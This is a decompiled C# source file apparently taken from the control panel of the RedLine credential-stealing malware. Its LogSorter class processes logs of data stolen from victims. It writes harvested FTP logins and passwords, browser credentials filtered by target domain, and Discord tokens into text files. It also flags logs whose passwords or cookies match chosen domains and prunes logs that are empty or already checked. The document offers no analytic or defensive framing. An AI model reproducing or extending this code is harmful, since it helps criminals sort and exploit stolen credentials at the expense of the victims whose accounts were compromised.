using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using RedLine.MainPanel.Data.Controllers;
using RedLine.MainPanel.Data.Extensions;
using RedLine.MainPanel.DbControllers;
using RedLine.MainPanel.LogExt;
using RedLine.MainPanel.Models;
using RedLine.MainPanel.Views.Old.Actions;
using RedLine.SharedModels;

namespace RedLine.MainPanel.Data;

public class LogSorter
{
	public DateTime DateTime = DateTime.Now;

	private object object_0 = new object();

	private object object_1;

	private object object_2;

	private IntPtr intptr_0;

	private IntPtr intptr_1;

	private IntPtr intptr_2;

	private object object_3 = new object();

	private object object_4;

	[CompilerGenerated]
	private readonly object object_5;

	private IntPtr a;

	public CurrentIndexChangedEventHandler OnIndexChanged;

	private string[] FileIDS
	{
		[CompilerGenerated]
		get
		{
			return (string[])object_5;
		}
	}

	public LogSorter(string outDir, SingleSearchParams searchParams, bool writeCounters = false)
	{
		object_4 = searchParams;
		object_2 = outDir;
		object_1 = new List<Thread>();
		object_5 = Directory.GetFiles(LazyLoader<UserLogsDb>.Instance.DataBaseDir);
		intptr_0 = (IntPtr)FileIDS.Count();
		a = (IntPtr)(writeCounters ? 1 : 0);
	}

	public int Sort()
	{
		LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
		LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
		UserLog[] source;
		if (((SingleSearchParams)object_4).RemoveEmptyLogs)
		{
			lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
			{
				source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
			}
			BindingList<UserLog> bindingList = new BindingList<UserLog>();
			bindingList.Add(source.Where((UserLog x) => x.Creds == "0|0|0|0"));
			foreach (UserLog newLog in bindingList)
			{
				LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
			}
			intptr_2 = (IntPtr)bindingList.Count;
		}
		for (int i = 0; i < 5; i++)
		{
			((List<Thread>)object_1).Add(new Thread(SingleSorter)
			{
				IsBackground = true,
				Priority = ThreadPriority.Highest
			});
		}
		foreach (Thread item in (List<Thread>)object_1)
		{
			item.Start();
		}
		foreach (Thread item2 in (List<Thread>)object_1)
		{
			item2.Join();
		}
		if (((SingleSearchParams)object_4).RemoveCheckedLogs)
		{
			lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
			{
				source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
			}
			foreach (UserLog newLog in new BindingList<UserLog> { source.Where((UserLog x) => x.Checked) })
			{
				LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
			}
		}
		LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
		LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
		LazyLoader<UserLogsDb>.Instance.PageController.Clear();
		LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
		LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
		return (int)(nint)intptr_2;
	}

	public void SingleSorter()
	{
		try
		{
			int num = 0;
			while (true)
			{
				try
				{
					lock (object_3)
					{
						num = (int)(nint)intptr_1;
						if (num > (nint)intptr_0)
						{
							break;
						}
						intptr_1 += (nint)1;
					}
					int num2 = Convert.ToInt32(new FileInfo(FileIDS[num]).Name.Split('.')[0]);
					UserLog userLog = LazyLoader<UserLogsDb>.Instance.LoadBody(num2);
					if (!string.IsNullOrWhiteSpace(userLog.HWID) && userLog.IsMatch((SingleSearchParams)object_4, (byte)(nint)a != 0))
					{
						if (((SingleSearchParams)object_4).SaveFtps)
						{
							if (userLog.Credentials.FtpConnections != null)
							{
								foreach (LoginPair ftpConnection in userLog.Credentials.FtpConnections)
								{
									lock (object_0)
									{
										File.AppendAllText(Path.Combine((string)object_2, "FtpAccounts.txt"), ftpConnection.Host + ":" + ftpConnection.Login + ":" + ftpConnection.Password + Environment.NewLine);
									}
								}
							}
						}
						else
						{
							if (((SingleSearchParams)object_4).RefreshDD)
							{
								new List<string>();
								List<string> obj = ((MainFrm.RemoteClientSettings.DDPatterns == null) ? new List<string>() : MainFrm.RemoteClientSettings.DDPatterns);
								userLog.PDD = string.Empty;
								userLog.CDD = string.Empty;
								foreach (string item in obj)
								{
									try
									{
										string[] array = item.Split('=');
										if (userLog.PasswordContains(array[1]))
										{
											userLog.PDD = userLog.PDD + array[0] + "|";
										}
										if (userLog.CookiesContains(array[1]))
										{
											userLog.CDD = userLog.CDD + array[0] + "|";
										}
									}
									catch
									{
									}
								}
								userLog.PDD = userLog.PDD.TrimEnd('|');
								userLog.CDD = userLog.CDD.TrimEnd('|');
							}
							if (!string.IsNullOrWhiteSpace(((SingleSearchParams)object_4).SetComment))
							{
								userLog.Comment = ((SingleSearchParams)object_4).SetComment;
							}
							if (((SingleSearchParams)object_4).SaveAccounts)
							{
								if (userLog.Credentials.Browsers != null)
								{
									foreach (Browser browser in userLog.Credentials.Browsers)
									{
										if (browser.Credentials == null)
										{
											continue;
										}
										foreach (LoginPair credential in browser.Credentials)
										{
											if (credential.Host.Contains(((SingleSearchParams)object_4).PasswordDomain))
											{
												lock (object_0)
												{
													File.AppendAllText(Path.Combine((string)object_2, ((SingleSearchParams)object_4).PasswordDomain + ".txt"), credential.FormatedString(((SingleSearchParams)object_4).SavingFormat) + Environment.NewLine);
												}
											}
										}
									}
								}
							}
							else if (((SingleSearchParams)object_4).SaveDisordTokens)
							{
								if (userLog.Credentials.Discord != null)
								{
									foreach (RemoteFile item2 in userLog.Credentials.Discord)
									{
										lock (object_0)
										{
											File.AppendAllText(Path.Combine((string)object_2, "DiscordTokens.txt"), Encoding.UTF8.GetString(item2.Body) + Environment.NewLine);
										}
									}
								}
							}
							else
							{
								List<string> domainDetects = ((MainFrm.RemoteClientSettings.DDPatterns == null) ? new List<string>() : MainFrm.RemoteClientSettings.DDPatterns.Cast<string>().ToList());
								userLog.SaveTo((string)object_2, MainFrm.RemoteClientSettings.SaveAsJSON, domainDetects, (byte)(nint)a != 0, ((SingleSearchParams)object_4).PasswordDomain);
							}
							userLog.Checked = true;
							LazyLoader<UserLogsDb>.Instance.Save(userLog);
							UserLog temp = userLog;
							temp.Credentials = new Credentials();
							temp.Screenshot = new byte[0];
							int index = LazyLoader<UserLogsDb>.Instance.FindIndex((UserLog x) => x.ID == temp.ID);
							LazyLoader<UserLogsDb>.Instance.DbInstance[index] = temp;
						}
					}
					userLog = default(UserLog);
				}
				catch (Exception)
				{
				}
				OnIndexChanged?.Invoke((int)((nint)intptr_1 - 1), (int)(nint)intptr_0);
				Application.DoEvents();
			}
		}
		catch (Exception)
		{
		}
	}
}
